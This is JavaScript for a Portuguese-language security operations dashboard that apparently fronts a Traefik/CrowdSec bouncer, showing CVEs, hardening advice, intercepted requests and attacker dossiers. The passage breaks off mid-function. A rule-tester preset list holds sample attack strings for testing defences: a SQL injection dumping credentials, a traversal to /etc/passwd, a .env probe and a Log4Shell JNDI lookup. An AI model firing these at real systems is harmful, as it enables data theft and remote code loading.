  initTechSubtabs();
  initThreatDossierModal();
}

// ====================================================
// TECHNICAL SPRINT: SECOPS, CVES, HARDENING & FORENSICS
// ====================================================

function initTechSubtabs() {
  const subnavBtns = document.querySelectorAll('.tech-subnav-btn');
  const subviews = document.querySelectorAll('.tech-subview');

  subnavBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.getAttribute('data-subtab');
      subnavBtns.forEach(b => b.classList.remove('active'));
      subviews.forEach(v => {
        v.style.display = 'none';
        v.classList.remove('active');
      });

      btn.classList.add('active');
      const activeView = document.getElementById(targetId);
      if (activeView) {
        activeView.style.display = 'block';
        activeView.classList.add('active');
      }
      feather.replace();
    });
  });

  const btnRefreshInsp = document.getElementById('btn-refresh-inspector');
  if (btnRefreshInsp) {
    btnRefreshInsp.addEventListener('click', () => {
      loadInspector();
    });
  }

  initTesterWorkbench();
}

async function loadTechnicalData() {
  loadCves();
  loadHardening();
  loadInspector();
}

async function loadCves() {
  const container = document.getElementById('cve-cards-container');
  try {
    const res = await fetch('/api/technical/cves');
    if (!res.ok) return;
    const data = await res.json();
    const cves = data.cves || [];

    if (document.getElementById('tech-cve-total')) {
      document.getElementById('tech-cve-total').textContent = `${cves.length} Vulnerabilidades`;
    }
    if (document.getElementById('tech-intercepts-total')) {
      document.getElementById('tech-intercepts-total').textContent = `${(data.summary.total_attempts_neutralized).toLocaleString()} ataques`;
    }

    if (!container) return;
    if (cves.length === 0) {
      container.innerHTML = '<div class="placeholder-text">Nenhuma CVE mapeada no momento.</div>';
      return;
    }

    container.innerHTML = cves.map(c => {
      const sevClass = c.severity === 'CRÍTICA' ? 'crit' : (c.severity === 'ALTA' ? 'high' : 'med');
      return `
        <div class="cve-card ${sevClass}">
          <div class="cve-card-top">
            <div class="cve-card-title">
              <h5>${c.name}</h5>
              <div class="cve-card-meta">
                <span class="badge ${c.severity === 'CRÍTICA' ? 'badge-danger' : (c.severity === 'ALTA' ? 'badge-warning' : 'badge-info')}">${c.cve_code}</span>
                <span>${c.cwe}</span>
                <span><strong>${c.mitigated_count}</strong> tentativas neutralizadas</span>
              </div>
            </div>
            <span class="cve-card-cvss ${sevClass}">CVSS ${c.cvss}</span>
          </div>

          <div class="cve-payload-box">
            <span class="lbl">Amostragem de Payload / Assinatura Interceptada:</span>
            <code>${c.payloads_observed[0] || 'N/A'}</code>
          </div>

          <div style="font-size: 0.76rem; color: var(--text-secondary); margin-bottom: 8px;">
            <strong>🎯 Alvo:</strong> ${c.targeted_services} &bull; <strong>🛡️ Defesa:</strong> ${c.ingress_defense}
          </div>

          <div class="cve-remediation-box">
            <div class="rem-title"><i data-feather="check-circle"></i> Ação Recomendada para o Backend / Dev:</div>
            <p>${c.internal_remediation}</p>
            ${c.remediation_code ? `
              <div class="remediation-snippet-box">
                <pre><code>${escapeHtml(c.remediation_code)}</code></pre>
              </div>
            ` : ''}
          </div>
        </div>
      `;
    }).join('');

    feather.replace();
  } catch (err) {
    if (container) container.innerHTML = `<div style="color: var(--danger);">Erro ao carregar catálogo de CVEs: ${err.message}</div>`;
  }
}

async function loadHardening() {
  const container = document.getElementById('hardening-checklist-container');
  try {
    const res = await fetch('/api/technical/hardening');
    if (!res.ok) return;
    const data = await res.json();

    if (document.getElementById('tech-hardening-score')) {
      document.getElementById('tech-hardening-score').textContent = `${data.score}%`;
    }

    if (!container) return;
    const recs = data.recommendations || [];

    container.innerHTML = recs.map((r, idx) => {
      const statusClass = r.status === 'pass' ? 'pass' : (r.status === 'warning' ? 'warning' : 'danger');
      const snippetId = `yaml-snippet-${idx}`;
      return `
        <div class="hardening-item ${statusClass}">
          <div class="hardening-header">
            <div class="hardening-title-group">
              <span class="badge ${r.status === 'pass' ? 'badge-success' : 'badge-warning'}">
                ${r.status === 'pass' ? 'CONFORME' : 'RECOMENDAÇÃO'}
              </span>
              <h5>${r.title}</h5>
            </div>
            <span class="hardening-scope-tag">Escopo: ${r.scope}</span>
          </div>

          <p class="hardening-desc">${r.description} <em>${r.risk_impact}</em></p>

          ${r.remediation_yaml ? `
            <div class="hardening-yaml-box">
              <button class="btn-copy-yaml" onclick="copyYaml('${snippetId}')">
                <i data-feather="copy"></i> Copiar YAML
              </button>
              <pre><code id="${snippetId}">${escapeHtml(r.remediation_yaml)}</code></pre>
            </div>
          ` : ''}
        </div>
      `;
    }).join('');

    feather.replace();
  } catch (err) {
    if (container) container.innerHTML = `<div style="color: var(--danger);">Erro ao carregar auditoria de hardening: ${err.message}</div>`;
  }
}

window.copyYaml = function(elementId) {
  const el = document.getElementById(elementId);
  if (!el) return;
  navigator.clipboard.writeText(el.innerText).then(() => {
    alert('✅ Snippet YAML copiado para a área de transferência!');
  }).catch(err => {
    alert('Erro ao copiar: ' + err);
  });
};

async function loadInspector() {
  const tbody = document.getElementById('inspector-table-body');
  if (!tbody) return;
  try {
    const res = await fetch('/api/technical/inspector');
    if (!res.ok) return;
    const data = await res.json();
    const events = data.events || [];

    if (events.length === 0) {
      tbody.innerHTML = '<tr><td colspan="7" class="loading-td">Nenhuma requisição interceptada recente.</td></tr>';
      return;
    }

    tbody.innerHTML = events.map(e => `
      <tr>
        <td><code>${formatDate(e.timestamp)}</code></td>
        <td>
          <a href="javascript:void(0)" class="ip-dossier-link" onclick="openThreatDossier('${e.ip}')" title="Clique para abrir o Dossiê Forense do Atacante">
            <span class="ip-badge">${e.ip} 🔍</span>
          </a>
          <span class="badge badge-outline" style="margin-left: 4px;">${e.country}</span>
        </td>
        <td><span class="badge ${e.http_method === 'POST' ? 'badge-warning' : 'badge-info'}">${e.http_method}</span></td>
        <td><code style="color: #f87171; font-size: 0.78rem;">${escapeHtml(e.raw_uri)}</code></td>
        <td><span style="font-size: 0.72rem; color: var(--text-muted);">${escapeHtml(e.user_agent)}</span></td>
        <td><span class="badge badge-outline">${e.scenario}</span></td>
        <td><span class="badge badge-danger">${e.action_taken}</span></td>
      </tr>
    `).join('');

    feather.replace();
  } catch (err) {
    tbody.innerHTML = `<tr><td colspan="7" style="color: var(--danger); text-align:center;">Erro ao carregar payloads: ${err.message}</td></tr>`;
  }
}

function initTesterWorkbench() {
  const selectRule = document.getElementById('tester-rule-type');
  const txtInput = document.getElementById('tester-input-payload');
  const btnRun = document.getElementById('btn-run-simulation');
  const resultBox = document.getElementById('tester-result-box');

  const rulePresets = {
    'sqli': "' UNION SELECT NULL,username,password FROM users--",
    'traversal': "/../../../../etc/passwd",
    'dotfiles': "GET /.env",
    'log4j': "${jndi:ldap://198.51.100.23:1389/Exploit}",
    'bad_agent': "User-Agent: sqlmap/1.7#stable (http://sqlmap.org)"
  };

  if (selectRule && txtInput) {
    selectRule.addEventListener('change', () => {
      if (rulePresets[selectRule.value]) {
        txtInput.value = rulePresets[selectRule.value];
      }
    });
  }

  if (btnRun && resultBox) {
    btnRun.addEventListener('click', async () => {
      const payload = {
        rule_type: selectRule.value,
        test_input: txtInput.value
      };

      resultBox.innerHTML = '<div class="loading-td">Disparando requisição e testando Traefik Bouncer...</div>';

      try {
        const res = await fetch('/api/technical/test-rule', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const data = await res.json();
        const sim = data.simulated_response;

        resultBox.innerHTML = `
          <div class="tester-success-card">
            <div class="tester-success-header">
              <i data-feather="check-circle" class="text-success" style="width: 24px; height: 24px;"></i>
              <h5>${data.assessment}</h5>
            </div>

            <div class="insp-row" style="margin-bottom: 6px;">
              <span class="insp-key">Código HTTP Retornado</span>
              <span class="insp-val"><span class="badge badge-danger">HTTP ${sim.http_status} ${sim.status_text}</span></span>
            </div>

            <div class="insp-row" style="margin-bottom: 6px;">
              <span class="insp-key">Latência de Interceptação</span>
              <span class="insp-val" style="color: var(--success); font-weight: 700;">${sim.detection_latency_ms} ms</span>
            </div>

            <div class="insp-row" style="margin-bottom: 6px;">
              <span class="insp-key">Cenário Mapeado</span>
              <span class="insp-val" style="color: var(--primary);">${sim.matched_scenario}</span>
            </div>

            <div class="insp-row" style="margin-bottom: 6px;">
              <span class="insp-key">Ação / Decisão do Bouncer</span>
              <span class="insp-val"><span class="badge badge-warning">${sim.decision}</span></span>
            </div>

            <div class="insp-row">
              <span class="insp-key">Assinatura de Resposta</span>
              <span class="insp-val" style="font-family: var(--font-mono); font-size: 0.72rem; color: #94a3b8;">${sim.security_header}</span>
            </div>
          </div>
        `;
        feather.replace();
      } catch (err) {
        resultBox.innerHTML = `<div style="color: var(--danger);">Erro no teste: ${err.message}</div>`;
      }
    });
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
}

// ====================================================
// THREAT ACTOR DOSSIER & KILL CHAIN CORRELATION MODAL
// ====================================================

let currentDossierData = null;

function initThreatDossierModal() {
  const modal = document.getElementById('modal-threat-dossier');
  const btnCloseX = document.getElementById('btn-close-dossier-modal');
  const btnClose = document.getElementById('btn-close-dossier-btn');
  const btnCopy = document.getElementById('btn-copy-dossier');
  const btnExportPdf = document.getElementById('btn-export-dossier-pdf');
  const btnExportJson = document.getElementById('btn-export-dossier-json');
  const btnBanSubnet = document.getElementById('btn-ban-dossier-subnet');

  if (btnCloseX && modal) {
    btnCloseX.addEventListener('click', () => modal.classList.remove('open'));
  }
  if (btnClose && modal) {
    btnClose.addEventListener('click', () => modal.classList.remove('open'));
  }
  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) modal.classList.remove('open');
    });
  }

  if (btnExportJson) {
    btnExportJson.addEventListener('click', () => {
      if (!currentDossierData) return;
      const jsonStr = JSON.stringify(currentDossierData, null, 2);
      const blob = new Blob([jsonStr], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `dossie_forense_${currentDossierData.ip.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    });
  }

  if (btnExportPdf) {
    btnExportPdf.addEventListener('click', () => {
      if (!currentDossierData) return;
      const d = currentDossierData;
      const c = d.correlation;
      const geo = d.geo || { city: 'Desconhecida', region: d.country, rdns_hostname: 'Sem PTR', network_type: 'Data Center' };
      const hashId = Math.random().toString(36).substring(2, 10).toUpperCase();

      const printWin = window.open('', '_blank');
      if (!printWin) {
        alert('Por favor, permita popups para gerar o laudo pericial em PDF.');
        return;
      }

      printWin.document.write(`
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Laudo Forense - ${d.ip} - Open Labs S.A.</title>
  <style>
    @page { size: A4 portrait; margin: 12mm; }
    body { font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; color: #0f172a; line-height: 1.4; margin: 0; padding: 0; font-size: 10.5pt; }
    .header { border-bottom: 2px solid #002244; padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: flex-start; }
    .brand-title { font-size: 15pt; font-weight: 800; color: #002244; text-transform: uppercase; margin: 0; }
    .brand-sub { font-size: 7.8pt; color: #64748b; margin: 2px 0 0 0; text-transform: uppercase; letter-spacing: 0.5px; }
    .doc-meta { text-align: right; font-size: 8.5pt; color: #475569; }
    .doc-meta strong { color: #002244; }
    
    .section-title { font-size: 10.5pt; font-weight: 700; color: #002244; border-left: 4px solid #008fa8; padding-left: 8px; margin: 14px 0 8px 0; text-transform: uppercase; }
    
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px; }
    .card { background: #f8fafc; border: 1px solid #cbd5e1; border-radius: 6px; padding: 8px 12px; }
    .card-label { font-size: 7.5pt; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 2px; }
    .card-val { font-size: 9.5pt; font-weight: 700; color: #0f172a; }
    
    .vuln-box { background: #fef2f2; border: 1px solid #fca5a5; border-radius: 6px; padding: 10px 12px; margin-bottom: 10px; }
    .vuln-header { display: flex; justify-content: space-between; font-weight: 700; color: #991b1b; font-size: 10.5pt; margin-bottom: 4px; }
    .badge { display: inline-block; padding: 2px 6px; font-size: 7.5pt; font-weight: 700; border-radius: 3px; }
    .badge-crit { background: #dc2626; color: #ffffff; }
    .badge-defense { background: #16a34a; color: #ffffff; }
    
    .timeline-table { width: 100%; border-collapse: collapse; margin-top: 6px; font-size: 8.5pt; }
    .timeline-table th { background: #f1f5f9; text-align: left; padding: 5px 8px; font-size: 7.8pt; color: #475569; border-bottom: 1px solid #cbd5e1; }
    .timeline-table td { padding: 5px 8px; border-bottom: 1px solid #e2e8f0; vertical-align: top; }
    
    .code-box { background: #0f172a; color: #38bdf8; font-family: monospace; font-size: 8pt; padding: 6px 10px; border-radius: 4px; overflow-x: auto; margin-top: 4px; }
    
    .footer { margin-top: 20px; border-top: 1px solid #cbd5e1; padding-top: 8px; display: flex; justify-content: space-between; font-size: 7.5pt; color: #64748b; }
    .avoid-break { page-break-inside: avoid; break-inside: avoid; }
  </style>
</head>
<body>
  <div class="header">
    <div>
      <h1 class="brand-title">Open Labs S.A.</h1>
      <p class="brand-sub">Uma empresa do grupo Altice Labs &bull; Centro de Operações de Segurança (SecOps)</p>
    </div>
    <div class="doc-meta">
      <div><strong>LAUDO PERICIAL FORENSE</strong></div>
      <div>Protocolo: #OLB-SEC-${hashId}</div>
      <div>Emitido em: ${new Date().toLocaleString('pt-BR')}</div>
    </div>
  </div>

  <div class="avoid-break">
    <div class="section-title">1. Identificação do Atacante, Geolocalização & DNS Reverso</div>
    <div class="grid-2">
      <div class="card">
        <div class="card-label">Endereço IP Suspeito / Host</div>
        <div class="card-val">${d.ip}</div>
      </div>
      <div class="card">
        <div class="card-label">Cidade & Região de Origem</div>
        <div class="card-val">📍 ${geo.city}, ${geo.region} (${d.country})</div>
      </div>
      <div class="card">
        <div class="card-label">Sistema Autônomo (ASN) & Provedor</div>
        <div class="card-val">${d.asn.name} (${d.asn.number})</div>
      </div>
      <div class="card">
        <div class="card-label">Tipo de Infraestrutura / Rede</div>
        <div class="card-val" style="color: #0284c7;">${geo.network_type}</div>
      </div>
      <div class="card" style="grid-column: span 2;">
        <div class="card-label">Hostname Reverso (rDNS / PTR)</div>
        <div class="card-val" style="font-family: monospace; font-size: 9pt; color: #0369a1;">${escapeHtml(geo.rdns_hostname)}</div>
      </div>
      <div class="card">
        <div class="card-label">Status de Contenção no Traefik Bouncer</div>
        <div class="card-val" style="color: #dc2626;">${d.is_banned ? '🛑 BLOQUEADO (HTTP 403 BAN ATIVO)' : '⚠️ MONITORAMENTO ATIVO'}</div>
      </div>
      <div class="card">
        <div class="card-label">Reputação Global na Comunidade (CTI)</div>
        <div class="card-val" style="color: #b91c1c;">${d.cti_consensus.global_reputation} (${d.cti_consensus.community_reports_count} reports)</div>
      </div>
    </div>
  </div>

  <div class="avoid-break">
    <div class="section-title">2. Correlação de Vulnerabilidade & Vetor de Exploração</div>
    <div class="vuln-box">
      <div class="vuln-header">
        <span>${c.vulnerability_name}</span>
        <span class="badge badge-crit">${c.cve_code} • CVSS ${c.cvss_score}</span>
      </div>
      <div style="font-size: 8.5pt; color: #4b5563; margin-bottom: 6px;">
        <strong>CWE:</strong> ${c.cwe} &bull; <strong>Técnica MITRE ATT&CK:</strong> ${c.mitre_attack.tactic} ➔ ${c.mitre_attack.technique}
      </div>
      <div style="font-size: 8.8pt; color: #1f2937; margin-bottom: 6px;">
        <strong>Intenção do Invasor:</strong> ${c.attacker_intent}
      </div>
      <div class="card-label">Amostragem de Payload Interceptado na Borda:</div>
      <div class="code-box">${escapeHtml(c.raw_payload_sampled)}</div>
    </div>
  </div>

  <div class="avoid-break">
    <div class="section-title">3. Cadeia de Ataque & Resposta do Ingress (Kill Chain Timeline)</div>
    <table class="timeline-table">
      <thead>
        <tr>
          <th style="width: 12%;">Tempo</th>
          <th style="width: 25%;">Fase Tática</th>
          <th style="width: 45%;">Ação / Requisição</th>
          <th style="width: 18%;">Status HTTP</th>
        </tr>
      </thead>
      <tbody>
        ${d.kill_chain_timeline.map(s => `
          <tr>
            <td><code>${s.time_offset}</code></td>
            <td><strong>${s.phase}</strong></td>
            <td>${escapeHtml(s.uri)}<br><small style="color: #64748b;">${s.desc}</small></td>
            <td><span class="badge ${s.status === 403 ? 'badge-defense' : 'badge-crit'}">HTTP ${s.status}</span></td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  </div>

  <div class="avoid-break" style="margin-top: 12px;">
    <div class="section-title">4. Plano de Remediação & Blindagem Interna Recomendada</div>
    <div class="card" style="background: #f0fdf4; border-color: #86efac;">
      <p style="font-size: 8.5pt; color: #166534; line-height: 1.4; margin: 0; white-space: pre-line;">${escapeHtml(c.internal_remediation)}</p>
    </div>
  </div>

  <div class="footer">
    <div>Open Labs S.A. &bull; CrowdSec Traefik Security Hub &bull; Relatório Pericial Auditável</div>
    <div>Página 1 de 1 &bull; Autenticidade Garantida</div>
  </div>

  <script>
    window.onload = function() {
      setTimeout(() => {
        window.print();
      }, 300);
    };
  <\/script>
</body>
</html>
      `);
      printWin.document.close();
    });
  }

  if (btnCopy) {
    btnCopy.addEventListener('click', () => {
      if (!currentDossierData) return;
      const d = currentDossierData;
      const c = d.correlation;
      const geo = d.geo || { city: 'Desconhecida', region: d.country, rdns_hostname: 'Sem PTR', network_type: 'Data Center' };
      const txt = `
=====================================================
DOSSIÊ FORENSE DE CORRELAÇÃO DE AMEAÇA - OPEN LABS S.A.
=====================================================
IP Suspeito: ${d.ip}
Localização: ${geo.city}, ${geo.region} (${d.country})
DNS Reverso (rDNS): ${geo.rdns_hostname}
Classificação de Rede: ${geo.network_type}
ASN / Provedor: ${d.asn.name} (${d.asn.number})
Status Bouncer: ${d.is_banned ? 'BLOQUEADO (BAN ATIVO)' : 'OBSERVAÇÃO ATIVA'}
Primeiro Registro: ${d.first_seen}
Total de Tentativas: ${d.total_alerts}

--- [CORRELAÇÃO DE VULNERABILIDADE] ---
Vulnerabilidade: ${c.vulnerability_name}
Código / CVE: ${c.cve_code} (CVSS: ${c.cvss_score} - ${c.severity})
Classificação CWE: ${c.cwe}
MITRE ATT&CK: ${c.mitre_attack.tactic} -> ${c.mitre_attack.technique}

--- [OBJETIVO DO ATACANTE] ---
${c.attacker_intent}

--- [AMOSTRAGEM DE PAYLOAD] ---
${c.raw_payload_sampled}

--- [AÇÃO DO INGRESS TRAEFIK] ---
${c.defense_action}

--- [RECOMENDAÇÃO DE HARDENING INTERNO] ---
${c.internal_remediation}
=====================================================
`;
      navigator.clipboard.writeText(txt.trim()).then(() => {
        alert('📋 Dossiê Forense copiado para a área de transferência com sucesso!');
      });
    });
  }

  if (btnBanSubnet) {
    btnBanSubnet.addEventListener('click', async () => {
      if (!currentDossierData) return;
      const ip = currentDossierData.ip;
      const parts = ip.split('.');
      const subnet = parts.length === 4 ? `${parts[0]}.${parts[1]}.${parts[2]}.0/24` : `${ip}/24`;
      
      if (!confirm(`Deseja bloquear toda a sub-rede ${subnet} por 24 horas no Traefik Ingress Bouncer?`)) return;

      try {
        const res = await fetch('/api/decisions', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ip: subnet,
            duration: '24h',
            reason: `Bloqueio de Sub-rede (${currentDossierData.correlation.cve_code})`,
            type: 'ban'
          })
        });
        if (res.ok) {
          alert(`✅ Sub-rede ${subnet} bloqueada com sucesso no Traefik Bouncer!`);
          loadDecisions();
          modal.classList.remove('open');
        } else {
          alert('Falha ao aplicar bloqueio de sub-rede.');
        }
      } catch (err) {
        alert('Erro: ' + err.message);
      }
    });
  }

  window.openThreatDossier = async function(ip) {
    if (!ip || ip === 'N/A' || ip === 'Desconhecido') return;
    const modal = document.getElementById('modal-threat-dossier');
    const titleEl = document.getElementById('dossier-title');
    const subEl = document.getElementById('dossier-ip-sub');
    const bodyEl = document.getElementById('dossier-body');
    const subnetLbl = document.getElementById('btn-ban-subnet-label');

    titleEl.textContent = `Dossiê Forense: ${ip}`;
    subEl.textContent = 'Carregando análise e correlação...';
    bodyEl.innerHTML = '<div class="loading-td">Correlacionando requisições, CVEs, Geointeligência e Kill Chain...</div>';
    modal.classList.add('open');

    try {
      const res = await fetch(`/api/threat-dossier/${encodeURIComponent(ip)}`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      currentDossierData = d;

      const c = d.correlation;
      const geo = d.geo || { city: 'Desconhecida', region: d.country, rdns_hostname: 'Sem PTR', network_type: 'Data Center', network_badge: 'badge-info' };
      const parts = ip.split('.');
      const subnetStr = parts.length === 4 ? `${parts[0]}.${parts[1]}.${parts[2]}.0/24` : `${ip}/24`;
      if (subnetLbl) subnetLbl.textContent = `Bloquear Sub-rede ${subnetStr}`;

      subEl.textContent = `📍 ${geo.city}, ${geo.region} (${d.country}) • ${d.asn.name} (${d.asn.number})`;

      bodyEl.innerHTML = `
        <!-- Top Bar Overview -->
        <div class="dossier-header-bar">
          <div class="dossier-header-ip">
            <i data-feather="shield-alert" class="text-danger" style="width: 28px; height: 28px;"></i>
            <div>
              <strong>${d.ip}</strong>
              <div style="font-size: 0.75rem; color: var(--text-muted);">Primeiro visto: ${formatDate(d.first_seen)} • ${d.total_alerts} tentativa(s) registradas</div>
            </div>
          </div>
          <div style="display: flex; gap: 8px; align-items: center; flex-wrap: wrap;">
            <span class="badge ${c.severity === 'CRÍTICA' ? 'badge-danger' : (c.severity === 'ALTA' ? 'badge-warning' : 'badge-info')}">
              SEVERIDADE ${c.severity} (CVSS ${c.cvss_score})
            </span>
            <span class="badge ${d.is_banned ? 'badge-danger' : 'badge-warning'}">
              ${d.is_banned ? '🛑 BAN ATIVO NA BORDA' : '⚠️ MONITORAMENTO ATIVO'}
            </span>
          </div>
        </div>

        <!-- Geo & Reverse DNS Highlight Banner -->
        <div style="background: rgba(0, 0, 0, 0.3); border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 10px 14px; margin-bottom: 14px;">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 8px;">
            <span style="font-size: 0.88rem; font-weight: 700; color: #ffffff;">📍 Localização: ${geo.city}, ${geo.region} (${d.country})</span>
            <span class="badge ${geo.network_badge}">${geo.network_type}</span>
          </div>
          <div style="font-size: 0.76rem; color: var(--text-muted); display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px;">
            <span><strong>DNS Reverso (rDNS / PTR):</strong> <code style="color: #38bdf8; font-size: 0.76rem;">${escapeHtml(geo.rdns_hostname)}</code></span>
            <span><strong>ASN:</strong> ${d.asn.name} (${d.asn.number})</span>
          </div>
        </div>

        <div class="dossier-grid">
          <!-- Col 1: Vulnerability Correlation & Objective -->
          <div class="dossier-card">
            <div class="dossier-card-title">
              <i data-feather="target"></i>
              <span>1. Correlação de Vulnerabilidade & CVE</span>
            </div>

            <div class="dossier-vuln-banner">
              <div class="dossier-vuln-header">
                <span class="dossier-vuln-name">${c.vulnerability_name}</span>
                <span class="badge badge-danger">${c.cve_code}</span>
              </div>
              <div style="font-size: 0.73rem; color: var(--text-muted); display: flex; gap: 10px; margin-top: 4px;">
                <span><strong>CWE:</strong> ${c.cwe}</span>
                <span><strong>MITRE:</strong> ${c.mitre_attack.technique}</span>
              </div>
            </div>

            <div class="dossier-card-title" style="margin-top: 4px;">
              <i data-feather="crosshair"></i>
              <span>2. Qual era o Objetivo do Invasor?</span>
            </div>
            <div class="dossier-intent-box">
              ${c.attacker_intent}
            </div>

            <div class="dossier-card-title" style="margin-top: 4px;">
              <i data-feather="code"></i>
              <span>3. Payload de Exploração Interceptado</span>
            </div>
            <div style="background: #090d16; border: 1px solid var(--border-color); border-radius: var(--radius-sm); padding: 8px 12px; margin-bottom: 12px;">
              <code style="font-family: var(--font-mono); font-size: 0.74rem; color: #f87171; word-break: break-all;">${escapeHtml(c.raw_payload_sampled)}</code>
            </div>

            <div class="dossier-card-title" style="margin-top: 4px;">
              <i data-feather="shield-check"></i>
              <span>4. Plano de Blindagem Interna (Backend)</span>
            </div>
            <div style="background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: var(--radius-sm); padding: 10px 12px; font-size: 0.76rem; color: #cbd5e1; line-height: 1.45; white-space: pre-line;">
              ${escapeHtml(c.internal_remediation)}
            </div>
          </div>

          <!-- Col 2: Attack Kill Chain Timeline & Reputation -->
          <div class="dossier-card">
            <div class="dossier-card-title">
              <i data-feather="clock"></i>
              <span>Cadeia de Ataque (Kill Chain)</span>
            </div>

            <div class="kill-chain-timeline">
              ${d.kill_chain_timeline.map(s => {
                const isDefense = s.status === 403;
                return `
                  <div class="kc-step ${isDefense ? 'defense' : 'active'}">
                    <div class="kc-dot"></div>
                    <div class="kc-header">
                      <span class="kc-phase">${s.phase}</span>
                      <span class="kc-time">${s.time_offset}</span>
                    </div>
                    <div class="kc-desc">${s.desc}</div>
                    <div class="kc-uri">${escapeHtml(s.uri)}</div>
                  </div>
                `;
              }).join('')}
            </div>

            <div class="dossier-card-title" style="margin-top: 18px;">
              <i data-feather="globe"></i>
              <span>Inteligência Global (CTI Consensus)</span>
            </div>
            <div style="font-size: 0.76rem; color: var(--text-secondary); line-height: 1.5;">
              <div class="insp-row" style="margin-bottom: 4px;">
                <span class="insp-key">Consenso da Rede:</span>
                <span class="insp-val" style="color: var(--danger); font-weight: 700;">${d.cti_consensus.global_reputation}</span>
              </div>
              <div class="insp-row" style="margin-bottom: 4px;">
                <span class="insp-key">Sensores Globais:</span>
                <span class="insp-val">${d.cti_consensus.community_reports_count} reportes mundiais</span>
              </div>
              <div class="insp-row" style="margin-bottom: 4px;">
                <span class="insp-key">Tipo de Agente:</span>
                <span class="insp-val" style="color: var(--primary);">${d.cti_consensus.threat_category}</span>
              </div>
            </div>
          </div>
        </div>
      `;

      feather.replace();
    } catch (err) {
      bodyEl.innerHTML = `<div style="color: var(--danger); padding: 20px; text-align: center;">Erro ao carregar dossiê: ${err.message}</div>`;
    }
  };
}

// ====================================================
// LIVE TACTICAL RADAR CONTROLLER (SOC REALTIME STREAM)
// ====================================================

let radarMapInstance = null;
let radarStreamTimer = null;
let showRadarLegit = true;
let showRadarThreats = true;

function initRadarMap() {
  if (radarMapInstance) {
    setTimeout(() => radarMapInstance.invalidateSize(), 100);
    return;
  }

  const mapEl = document.getElementById('live-tactical-map');
  if (!mapEl) return;

  radarMapInstance = L.map('live-tactical-map', {
    center: [15, 0],
    zoom: 2,
    minZoom: 1.5,
    maxZoom: 9,
    zoomControl: false,
    attributionControl: false
  });

  L.control.zoom({ position: 'bottomright' }).addTo(radarMapInstance);

  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    subdomains: 'abcd',
    maxZoom: 19
  }).addTo(radarMapInstance);

  // Central Open Labs Primary Ingress Hub Marker (São Paulo)
  const spCoord = [-23.5505, -46.6333];
  const hubIcon = L.divIcon({
    className: 'hub-pulse-marker',
    html: '<div style="width: 16px; height: 16px; background: #00f0ff; border: 2px solid #ffffff; border-radius: 50%; box-shadow: 0 0 14px #00f0ff;"></div>',
    iconSize: [16, 16],
    iconAnchor: [8, 8]
  });

  L.marker(spCoord, { icon: hubIcon }).addTo(radarMapInstance)
    .bindTooltip('<strong>Open Labs S.A. Hub</strong><br>São Paulo (Borda Ingress)', { permanent: false, direction: 'top' });

  // Filter Buttons Handlers
  const btnLegit = document.getElementById('btn-toggle-radar-legit');
  const btnThreats = document.getElementById('btn-toggle-radar-threats');
  const btnFullscreen = document.getElementById('btn-radar-fullscreen');

  if (btnLegit) {
    btnLegit.addEventListener('click', () => {
      showRadarLegit = !showRadarLegit;
      btnLegit.classList.toggle('active-filter', showRadarLegit);
      btnLegit.style.opacity = showRadarLegit ? '1' : '0.4';
    });
  }

  if (btnThreats) {
    btnThreats.addEventListener('click', () => {
      showRadarThreats = !showRadarThreats;
      btnThreats.classList.toggle('active-filter', showRadarThreats);
      btnThreats.style.opacity = showRadarThreats ? '1' : '0.4';
    });
  }

  if (btnFullscreen) {
    btnFullscreen.addEventListener('click', () => {
      const radarTab = document.getElementById('tab-radar');
      if (!radarTab) return;
      radarTab.classList.toggle('soc-fullscreen');
      const isFull = radarTab.classList.contains('soc-fullscreen');
      btnFullscreen.innerHTML = isFull ? '<i data-feather="minimize"></i> <span>Sair do Telão</span>' : '<i data-feather="maximize"></i> <span>Modo Telão (SOC)</span>';
      feather.replace();
      setTimeout(() => {
        if (radarMapInstance) radarMapInstance.invalidateSize();
      }, 200);
    });
  }
}

function startRadarStream() {
  if (radarStreamTimer) clearInterval(radarStreamTimer);

  fetchAndRenderRadarEvents();
  radarStreamTimer = setInterval(fetchAndRenderRadarEvents, 3500);
}

async function fetchAndRenderRadarEvents() {
  try {
    const res = await fetch('/api/radar/events');
    if (!res.ok) return;
    const data = await res.json();

    const stats = data.radar_meta?.stats;
    if (stats) {
      if (document.getElementById('radar-kpi-legit')) document.getElementById('radar-kpi-legit').textContent = stats.legit_rate_per_min;
      if (document.getElementById('radar-kpi-threats')) document.getElementById('radar-kpi-threats').textContent = stats.threat_rate_per_min;
      if (document.getElementById('radar-kpi-ratio')) document.getElementById('radar-kpi-ratio').textContent = `${stats.block_ratio_percent}%`;
    }

    const events = data.events || [];
    const tickerContainer = document.getElementById('radar-events-stream');

    if (!events.length) return;

    // Separate legitimate and blocked events to guarantee balanced simultaneous emission
    const legitEvents = events.filter(e => e.type === 'legit');
    const blockedEvents = events.filter(e => e.type === 'blocked');

    const pickedEvents = [];

    if (showRadarLegit && legitEvents.length > 0) {
